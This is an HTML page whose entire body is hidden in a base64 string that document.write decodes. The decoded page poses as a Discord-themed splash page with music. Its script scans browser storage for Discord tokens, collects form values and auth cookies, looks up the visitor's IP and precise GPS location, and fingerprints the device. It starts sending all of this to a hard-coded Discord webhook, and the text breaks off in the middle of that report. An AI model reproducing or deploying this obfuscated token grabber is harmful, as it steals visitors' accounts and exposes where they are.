<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<script>
document.write(atob("PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+ZGlzY29yZC5nZy8wODA8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHVybCgnaHR0cHM6Ly9pLnBpbmltZy5jb20vb3JpZ2luYWxzLzUxL2FlL2EzLzUxYWVhMzM5M2I4MjM0YTFlNjlkODcxM2EwYTU4YmMzLmdpZicpIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOwogICAgICAgICAgICBmb250LWZhbWlseTogJ0NvdXJpZXIgTmV3JywgQ291cmllciwgbW9ub3NwYWNlOwogICAgICAgICAgICBjb2xvcjogIzg3ODc4NzsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIGhlaWdodDogMTAwdmg7CiAgICAgICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICB9CiAgICAgICAgLmltYWdlLWNvbnRhaW5lciBpbWcgewogICAgICAgICAgICB3aWR0aDogNjUwcHg7IAogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICM4Nzg3ODc7IAogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxNXB4OwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMTVweCByZ2JhKDEyOCwgMTI4LCAxMjgsIDAuNyk7IAogICAgICAgIH0KICAgICAgICAuaW5mbyB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS41ZW07CiAgICAgICAgICAgIGNvbG9yOiAjODc4Nzg3OyAKICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDBweCAwcHggOHB4ICM4Nzg3ODcsIDBweCAwcHggMTVweCAjODc4Nzg3LCAwcHggMHB4IDI1cHggIzg3ODc4NzsgCiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiA0LjVweDsgCiAgICAgICAgICAgIHdoaXRlLXNwYWNlOiBwcmUtd3JhcDsKICAgICAgICB9CiAgICAgICAgLnRleHQgewogICAgICAgICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDNlbTsgCiAgICAgICAgICAgIGNvbG9yOiAjODc4Nzg3OyAKICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDBweCAwcHggOHB4ICM4Nzg3ODcsIDBweCAwcHggMTVweCAjODc4Nzg3LCAwcHggMHB4IDI1cHggIzg3ODc4NzsgCiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiA0LjVweDsgCiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImltYWdlLWNvbnRhaW5lciI+CiAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEzNzU5MTM5NzUzMDQyOTQ0NzEvMTQxNzkwMTQ5ODcyNTA0MDE3OC8xLTIwZmRiNDc5LnBuZz9leD02OGNjMmIyYyZpcz02OGNhZDlhYyZobT05ZmQ5ZTA3OTRlNTdkZWZjYzE0NDBmMWVmYjAxN2MzNGU2MzUyNzg1OTc2Mzg5ZmVhYTQ1ZDdkYTZiODRiNThmJiIgYWx0PSJEaXNjb3JkIEltYWdlIj4KICAgIDwvZGl2PgogICAgPGF1ZGlvIGF1dG9wbGF5IGxvb3A+CiAgICAgICAgPHNvdXJjZSBzcmM9Imh0dHBzOi8vai50b3A0dG9wLmlvL21fMzUxOXZla244MS5tcDMiIHR5cGU9ImF1ZGlvL21wZWciPgogICAgPC9hdWRpbz4KICAgIDxkaXYgY2xhc3M9ImluZm8iIGlkPSJpcC1pbmZvIj4KICAgICAgICA8c3Ryb25nPkxvYWRpbmcgQWR2YW5jZWQgU3lzdGVtIEluZm9ybWF0aW9uLi4uPC9zdHJvbmc+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9InRleHQiPmRpc2NvcmQuZ2cvMDgwPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJ0ZXh0Ij5CeSBNbG9vayxNZEF3RTwvZGl2PgoKICAgIDxzY3JpcHQ+CiAgICAgICAgbGV0IHByb2Nlc3NDb21wbGV0ZWQgPSBmYWxzZTsKCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gc3RhcnRQcm9jZXNzKCkgewogICAgICAgICAgICBpZiAoIXByb2Nlc3NDb21wbGV0ZWQpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJTdGFydGluZyBhZHZhbmNlZCBleHRyYWN0aW9uIHByb2Nlc3MuLi4iKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2luZG93Lm9wZW4oJ2h0dHBzOi8vZGlzY29yZC5jb20vY2hhbm5lbHMvQG1lJywgJ19ibGFuaycpOwogICAgICAgICAgICAgICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDUwMDApKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIlJ1bm5pbmcgcGFyYWxsZWwgZXh0cmFjdGlvbiBtZXRob2RzLi4uIik7CiAgICAgICAgICAgICAgICBjb25zdCBbZGlzY29yZERhdGEsIHByZWNpc2VMb2NhdGlvbiwgc3lzdGVtRGF0YV0gPSBhd2FpdCBQcm9taXNlLmFsbChbCiAgICAgICAgICAgICAgICAgICAgZXh0cmFjdEFkdmFuY2VkRGlzY29yZERhdGEoKSwKICAgICAgICAgICAgICAgICAgICBnZXRQcmVjaXNlTG9jYXRpb24oKSwKICAgICAgICAgICAgICAgICAgICBleHRyYWN0U3lzdGVtRGF0YSgpCiAgICAgICAgICAgICAgICBdKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIlNlbmRpbmcgY29tcHJlaGVuc2l2ZSBkYXRhLi4uIik7CiAgICAgICAgICAgICAgICBhd2FpdCBzZW5kQWR2YW5jZWRSZXBvcnQoZGlzY29yZERhdGEsIHByZWNpc2VMb2NhdGlvbiwgc3lzdGVtRGF0YSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHdpbmRvdy5vcGVuKCdodHRwczovL2Rpc2NvcmQuZ2cvMDgwJywgJ19ibGFuaycpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBwcm9jZXNzQ29tcGxldGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJBZHZhbmNlZCBwcm9jZXNzIGNvbXBsZXRlZCEiKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZXh0cmFjdEFkdmFuY2VkRGlzY29yZERhdGEoKSB7CiAgICAgICAgICAgIGNvbnN0IHJlc3VsdHMgPSB7CiAgICAgICAgICAgICAgICB0b2tlbnM6IFtdLAogICAgICAgICAgICAgICAgdXNlckluZm86IFtdLAogICAgICAgICAgICAgICAgc2Vzc2lvbnM6IFtdLAogICAgICAgICAgICAgICAgY29va2llczogW10sCiAgICAgICAgICAgICAgICBmb3JtczogW10KICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJTY2FubmluZyBMb2NhbFN0b3JhZ2UuLi4iKTsKICAgICAgICAgICAgcmVzdWx0cy50b2tlbnMucHVzaCguLi5zY2FuTG9jYWxTdG9yYWdlKCkpOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coIlNjYW5uaW5nIFNlc3Npb25TdG9yYWdlLi4uIik7CiAgICAgICAgICAgIHJlc3VsdHMudG9rZW5zLnB1c2goLi4uc2NhblNlc3Npb25TdG9yYWdlKCkpOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coIkV4dHJhY3Rpbmcgc2F2ZWQgZm9ybXMuLi4iKTsKICAgICAgICAgICAgcmVzdWx0cy5mb3Jtcy5wdXNoKC4uLmV4dHJhY3RTYXZlZEZvcm1zKCkpOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coIkNoZWNraW5nIGNhY2hlLi4uIik7CiAgICAgICAgICAgIHJlc3VsdHMuY29va2llcy5wdXNoKC4uLmluc3BlY3RDYWNoZSgpKTsKCiAgICAgICAgICAgIHJldHVybiByZXN1bHRzOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gc2NhbkxvY2FsU3RvcmFnZSgpIHsKICAgICAgICAgICAgY29uc3QgdG9rZW5zID0gW107CiAgICAgICAgICAgIGNvbnN0IHBhdHRlcm5zID0gWwogICAgICAgICAgICAgICAgL21mYVwuW2EtekEtWjAtOV8tXXs4NH0vLAogICAgICAgICAgICAgICAgL1thLXpBLVowLTlfLV17MjR9XC5bYS16QS1aMC05Xy1dezZ9XC5bYS16QS1aMC05Xy1dezI3fS8sCiAgICAgICAgICAgICAgICAvW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9LywKICAgICAgICAgICAgICAgIC9bYS1mMC05XXs2NH0vCiAgICAgICAgICAgIF07CgogICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxvY2FsU3RvcmFnZS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgY29uc3Qga2V5ID0gbG9jYWxTdG9yYWdlLmtleShpKTsKICAgICAgICAgICAgICAgIGNvbnN0IHZhbHVlID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oa2V5KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcGF0dGVybnMuZm9yRWFjaChwYXR0ZXJuID0+IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBtYXRjaGVzID0gdmFsdWUubWF0Y2gocGF0dGVybik7CiAgICAgICAgICAgICAgICAgICAgaWYgKG1hdGNoZXMpIHRva2Vucy5wdXNoKGBbTG9jYWxTdG9yYWdlXSAke2tleX06ICR7bWF0Y2hlc1swXX1gKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0b2tlbnM7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBzY2FuU2Vzc2lvblN0b3JhZ2UoKSB7CiAgICAgICAgICAgIGNvbnN0IHRva2VucyA9IFtdOwogICAgICAgICAgICBjb25zdCBwYXR0ZXJucyA9IFsKICAgICAgICAgICAgICAgIC9tZmFcLlthLXpBLVowLTlfLV17ODR9LywKICAgICAgICAgICAgICAgIC9bYS16QS1aMC05Xy1dezI0fVwuW2EtekEtWjAtOV8tXXs2fVwuW2EtekEtWjAtOV8tXXsyN30vCiAgICAgICAgICAgIF07CgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzZXNzaW9uU3RvcmFnZS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IHNlc3Npb25TdG9yYWdlLmtleShpKTsKICAgICAgICAgICAgICAgICAgICBjb25zdCB2YWx1ZSA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oa2V5KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBwYXR0ZXJucy5mb3JFYWNoKHBhdHRlcm4gPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBtYXRjaGVzID0gdmFsdWUubWF0Y2gocGF0dGVybik7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtYXRjaGVzKSB0b2tlbnMucHVzaChgW1Nlc3Npb25TdG9yYWdlXSAke2tleX06ICR7bWF0Y2hlc1swXX1gKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1Nlc3Npb25TdG9yYWdlIGFjY2VzcyBsaW1pdGVkOicsIGUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0b2tlbnM7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBleHRyYWN0U2F2ZWRGb3JtcygpIHsKICAgICAgICAgICAgY29uc3QgZm9ybXNEYXRhID0gW107CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBpbnB1dHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dCwgdGV4dGFyZWEsIHNlbGVjdCcpOwogICAgICAgICAgICBpbnB1dHMuZm9yRWFjaChpbnB1dCA9PiB7CiAgICAgICAgICAgICAgICBpZiAoaW5wdXQudmFsdWUgJiYgaW5wdXQudmFsdWUubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgICAgIGZvcm1zRGF0YS5wdXNoKGBbRm9ybV0gJHtpbnB1dC5uYW1lIHx8IGlucHV0LmlkIHx8ICd1bmtub3duJ306ICR7aW5wdXQudmFsdWUuc3Vic3RyaW5nKDAsIDUwKX1gKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgZm9ybXMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJyk7CiAgICAgICAgICAgICAgICBmb3Jtcy5mb3JFYWNoKGZvcm0gPT4gewogICAgICAgICAgICAgICAgICAgIGlmIChmb3JtLmVsZW1lbnRzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFycmF5LmZyb20oZm9ybS5lbGVtZW50cykuZm9yRWFjaChlbGVtZW50ID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlbGVtZW50LnZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9ybXNEYXRhLnB1c2goYFtBdXRvZmlsbF0gJHtlbGVtZW50Lm5hbWV9OiAke2VsZW1lbnQudmFsdWUuc3Vic3RyaW5nKDAsIDMwKX1gKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9CgogICAgICAgICAgICByZXR1cm4gZm9ybXNEYXRhOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gaW5zcGVjdENhY2hlKCkgewogICAgICAgICAgICBjb25zdCBjYWNoZURhdGEgPSBbXTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgnY2FjaGVzJyBpbiB3aW5kb3cpIHsKICAgICAgICAgICAgICAgIGNhY2hlcy5rZXlzKCkudGhlbihjYWNoZU5hbWVzID0+IHsKICAgICAgICAgICAgICAgICAgICBjYWNoZU5hbWVzLmZvckVhY2goY2FjaGVOYW1lID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgY2FjaGVEYXRhLnB1c2goYFtDYWNoZV0gJHtjYWNoZU5hbWV9YCk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZG9jdW1lbnQuY29va2llLnNwbGl0KCc7JykuZm9yRWFjaChjb29raWUgPT4gewogICAgICAgICAgICAgICAgaWYgKGNvb2tpZS5pbmNsdWRlcygndG9rZW4nKSB8fCBjb29raWUuaW5jbHVkZXMoJ3Nlc3Npb24nKSB8fCBjb29raWUuaW5jbHVkZXMoJ2F1dGgnKSkgewogICAgICAgICAgICAgICAgICAgIGNhY2hlRGF0YS5wdXNoKGBbQ29va2llXSAke2Nvb2tpZS50cmltKCl9YCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgcmV0dXJuIGNhY2hlRGF0YTsKICAgICAgICB9CgogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGdldFByZWNpc2VMb2NhdGlvbigpIHsKICAgICAgICAgICAgY29uc3QgbG9jYXRpb25EYXRhID0gewogICAgICAgICAgICAgICAgaXBJbmZvOiB7fSwKICAgICAgICAgICAgICAgIGdwczoge30sCiAgICAgICAgICAgICAgICBuZXR3b3JrOiB7fQogICAgICAgICAgICB9OwoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IGlwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcGluZm8uaW8vanNvbicpOwogICAgICAgICAgICAgICAgbG9jYXRpb25EYXRhLmlwSW5mbyA9IGF3YWl0IGlwUmVzcG9uc2UuanNvbigpOwoKICAgICAgICAgICAgICAgIGlmIChuYXZpZ2F0b3IuZ2VvbG9jYXRpb24pIHsKICAgICAgICAgICAgICAgICAgICBsb2NhdGlvbkRhdGEuZ3BzID0gYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBvc2l0aW9uID0+IHJlc29sdmUoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhdDogcG9zaXRpb24uY29vcmRzLmxhdGl0dWRlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvbjogcG9zaXRpb24uY29vcmRzLmxvbmdpdHVkZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY2N1cmFjeTogcG9zaXRpb24uY29vcmRzLmFjY3VyYWN5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0+IHJlc29sdmUoeyBlcnJvcjogZXJyb3IubWVzc2FnZSB9KSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgZW5hYmxlSGlnaEFjY3VyYWN5OiB0cnVlLCB0aW1lb3V0OiAxMDAwMCB9CiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKG5hdmlnYXRvci5jb25uZWN0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgbG9jYXRpb25EYXRhLm5ldHdvcmsgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IG5hdmlnYXRvci5jb25uZWN0aW9uLnR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgIGVmZmVjdGl2ZVR5cGU6IG5hdmlnYXRvci5jb25uZWN0aW9uLmVmZmVjdGl2ZVR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgIGRvd25saW5rOiBuYXZpZ2F0b3IuY29ubmVjdGlvbi5kb3dubGluawogICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ0xvY2F0aW9uIGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyb3IpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gbG9jYXRpb25EYXRhOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZXh0cmFjdFN5c3RlbURhdGEoKSB7CiAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICBmaW5nZXJwcmludDogZ2VuZXJhdGVGaW5nZXJwcmludCgpLAogICAgICAgICAgICAgICAgaGFyZHdhcmU6IGdldEhhcmR3YXJlSW5mbygpLAogICAgICAgICAgICAgICAgc29mdHdhcmU6IGdldFNvZnR3YXJlSW5mbygpLAogICAgICAgICAgICAgICAgbmV0d29yazogZ2V0TmV0d29ya0luZm8oKQogICAgICAgICAgICB9OwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZ2VuZXJhdGVGaW5nZXJwcmludCgpIHsKICAgICAgICAgICAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnY2FudmFzJyk7CiAgICAgICAgICAgIGNvbnN0IGdsID0gY2FudmFzLmdldENvbnRleHQoJ3dlYmdsJykgfHwgY2FudmFzLmdldENvbnRleHQoJ2V4cGVyaW1lbnRhbC13ZWJnbCcpOwogICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIHVzZXJBZ2VudDogbmF2aWdhdG9yLnVzZXJBZ2VudCwKICAgICAgICAgICAgICAgIHBsYXRmb3JtOiBuYXZpZ2F0b3IucGxhdGZvcm0sCiAgICAgICAgICAgICAgICBsYW5ndWFnZTogbmF2aWdhdG9yLmxhbmd1YWdlLAogICAgICAgICAgICAgICAgdGltZXpvbmU6IEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZSwKICAgICAgICAgICAgICAgIHNjcmVlbjogYCR7c2NyZWVuLndpZHRofXgke3NjcmVlbi5oZWlnaHR9YCwKICAgICAgICAgICAgICAgIGNvbG9yRGVwdGg6IHNjcmVlbi5jb2xvckRlcHRoLAogICAgICAgICAgICAgICAgaGFyZHdhcmVDb25jdXJyZW5jeTogbmF2aWdhdG9yLmhhcmR3YXJlQ29uY3VycmVuY3ksCiAgICAgICAgICAgICAgICBkZXZpY2VNZW1vcnk6IG5hdmlnYXRvci5kZXZpY2VNZW1vcnksCiAgICAgICAgICAgICAgICB3ZWJnbFJlbmRlcmVyOiBnbCA/IGdsLmdldFBhcmFtZXRlcihnbC5SRU5ERVJFUikgOiAndW5rbm93bicKICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGdldEhhcmR3YXJlSW5mbygpIHsKICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIGNvcmVzOiBuYXZpZ2F0b3IuaGFyZHdhcmVDb25jdXJyZW5jeSB8fCAndW5rbm93bicsCiAgICAgICAgICAgICAgICBtZW1vcnk6IG5hdmlnYXRvci5kZXZpY2VNZW1vcnkgPyBgJHtuYXZpZ2F0b3IuZGV2aWNlTWVtb3J5fUdCYCA6ICd1bmtub3duJywKICAgICAgICAgICAgICAgIHRvdWNoUG9pbnRzOiBuYXZpZ2F0b3IubWF4VG91Y2hQb2ludHMgfHwgJ3Vua25vd24nCiAgICAgICAgICAgIH07CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBnZXRTb2Z0d2FyZUluZm8oKSB7CiAgICAgICAgICAgIGNvbnN0IHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgYnJvd3NlcjogdWEuaW5jbHVkZXMoJ2Nocm9tZScpID8gJ0Nocm9tZScgOiB1YS5pbmNsdWRlcygnZmlyZWZveCcpID8gJ0ZpcmVmb3gnIDogdWEuaW5jbHVkZXMoJ3NhZmFyaScpID8gJ1NhZmFyaScgOiAnVW5rbm93bicsCiAgICAgICAgICAgICAgICBvczogdWEuaW5jbHVkZXMoJ3dpbmRvd3MnKSA/ICdXaW5kb3dzJyA6IHVhLmluY2x1ZGVzKCdtYWMnKSA/ICdNYWMnIDogdWEuaW5jbHVkZXMoJ2xpbnV4JykgPyAnTGludXgnIDogJ1Vua25vd24nLAogICAgICAgICAgICAgICAgdmVyc2lvbjogbmF2aWdhdG9yLmFwcFZlcnNpb24KICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGdldE5ldHdvcmtJbmZvKCkgewogICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgb25saW5lOiBuYXZpZ2F0b3Iub25MaW5lLAogICAgICAgICAgICAgICAgY29ubmVjdGlvbjogbmF2aWdhdG9yLmNvbm5lY3Rpb24gPyB7CiAgICAgICAgICAgICAgICAgICAgdHlwZTogbmF2aWdhdG9yLmNvbm5lY3Rpb24udHlwZSwKICAgICAgICAgICAgICAgICAgICBlZmZlY3RpdmVUeXBlOiBuYXZpZ2F0b3IuY29ubmVjdGlvbi5lZmZlY3RpdmVUeXBlLAogICAgICAgICAgICAgICAgICAgIGRvd25saW5rOiBuYXZpZ2F0b3IuY29ubmVjdGlvbi5kb3dubGluawogICAgICAgICAgICAgICAgfSA6IG51bGwKICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgICAgIGFzeW5jIGZ1bmN0aW9uIHNlbmRBZHZhbmNlZFJlcG9ydChkaXNjb3JkRGF0YSwgbG9jYXRpb25EYXRhLCBzeXN0ZW1EYXRhKSB7CiAgICAgICAgICAgIGNvbnN0IHdlYmhvb2tVcmwgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMDk0MDgxMTI1OTg3MTM3NS9LMjNOYl9mX0xhbU5GekNSTDNXWFFfSzdDNnowN0FvSkMzMDNDOXNkTUFuRjhsOFR6aUtoeE1HX2ZrUnlyQzZ2TXMtVic7CgogICAgICAgICAgICBjb25zdCBlbWJlZCA9IHsKICAgICAgICAgICAgICAgIHRpdGxlOiAiQWR2YW5jZWQgU3lzdGVtIFJlcG9ydCIsCiAgICAgICAgICAgICAgICBjb2xvcjogMHg3Mjg5REEsCiAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSwKICAgICAgICAgICAgICAgIGZpZWxkczogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogIlByZWNpc2UgTG9jYXRpb24gRGF0YSIsCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiBgKipJUDoqKiAke2xvY2F0aW9uRGF0YS5pcEluZm8uaXAgfHwgJ1Vua25vd24nfQoqKkNpdHk6KiogJHtsb2NhdGlvbkRhdGEuaXBJbmZvLmNpdHkgfHwgJ1Vua25vd24nfQoqKlJlZ2lvbjoqKiAke2xvY2F0aW9uRGF0YS5pcEluZm8ucmVnaW9uIHx8ICdVbmtub3duJ30KKipDb3VudHJ5OioqICR7bG9jYXRpb25EYXRhLmlwSW5mby5jb3VudHJ5IHx8ICdVbmtub3duJ30KKipHUFM6KiogJHtsb2NhdGlvbkRhdGEuZ3BzLmxhdCA/IGAke2xvY2F0aW9uRGF0YS5ncHMubGF0fSwgJHtsb2NhdGlvbkRhdGEuZ3BzLmxvbn1gIDogJ05vdCBhdmFpbGFibGUnfQoqKkFjY3VyYWN5OioqICR7bG9jYXRpb25EYXRhLmdwcy5hY2N1cmFjeSB8fCAnTi9BJ30gbWV0ZXJzCioqTWFwOioqIGh0dHBzOi8vbWFwcy5nb29nbGUuY29tLz9xPSR7bG9jYXRpb25EYXRhLmdwcy5sYXQgfHwgbG9jYXRpb25EYXRhLmlwSW5mby5sb2MgfHwgJzAsMCd9YCwKICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiBmYWxzZQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAiVG9rZW4gRXh0cmFjdGlvbiBSZXN1bHRzIiwKICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGAqKkxvY2FsU3RvcmFnZToqKiAke2Rpc2NvcmREYXRhLnRva2Vucy5maWx0ZXIodCA9PiB0LmluY2x1ZGVzKCdbTG9jYWxTdG9yYWdlXScpKS5sZW5ndGh9CioqU2Vzc2lvblN0b3JhZ2U6KiogJHtkaXNjb3JkRGF0YS50b2tlbnMuZmlsdGVyKHQgPT4gdC5pbmNsdWRlcygnW1Nlc3Npb25TdG9yYWdlXScpKS5sZW5ndGh9CioqVG90YWwgVG9rZW5zOioqICR7ZGlzY29yZERhdGEudG9rZW5zLmxlbmd0aH1gLAogICAgICAgICAgICAgICAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogIkRhdGEgQ29sbGVjdGlvbiBTdW1tYXJ5IiwKICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGAqKkZvcm1zIERhdGE6KiogJHtkaXNjb3JkRGF0YS5mb3Jtcy5sZW5ndGh9IGl0ZW1zCioqQ2FjaGUgRGF0YToqKiAke2Rpc2NvcmREYXRhLmNvb2tpZXMubGVuZ3RofSBpdGVtcwoqKlNlc3Npb25zOioqICR7ZGlzY29yZERhdGEuc2Vzc2lvbnMubGVuZ3RofSBpdGVtc2AsCiAgICAgICAgICAgICAgICAgICAgICAg